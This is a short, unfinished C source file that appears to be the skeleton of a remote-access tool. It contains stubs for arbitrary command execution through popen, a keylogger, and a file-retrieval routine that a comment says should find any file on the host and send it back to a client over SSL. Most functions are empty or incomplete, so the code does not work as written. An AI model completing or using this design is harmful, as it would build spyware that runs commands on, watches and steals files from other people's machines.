#include "functionality.h"

sendResult(char *result);

void executeSystemCall(char *command)
{
}

/*
 First run the system command "updatedb" to build the database of all files,
 then run "locate FILENAME" and store the results in a buffer. Either we just
 take the first result, or we iterrate through all the files listed? Either way
 we open the file and send it back over to the client via SSL. Running this
 command requires the popen command. Should make use of the executeSystemCall()
 function.
*/
void retrieveFile(char *file)
{
    
    // Update the database for locate
    system("updatedb");
    
    
}

void keylogger()
{
    
}

char *executeHelper(char *command)
{
    char line[PATH_MAX];
    FILE *results = NULL;
    
    // Execute and open the pipe for reading
    results = popen(command, "r");
    
    // Make sure we have something yo
    if (results == NULL)
    {
        return NULL;
    }
    
    // Read from the stream
    while (fgets(line, PATH_MAX, results) != NULL)
    {
        
    }
}
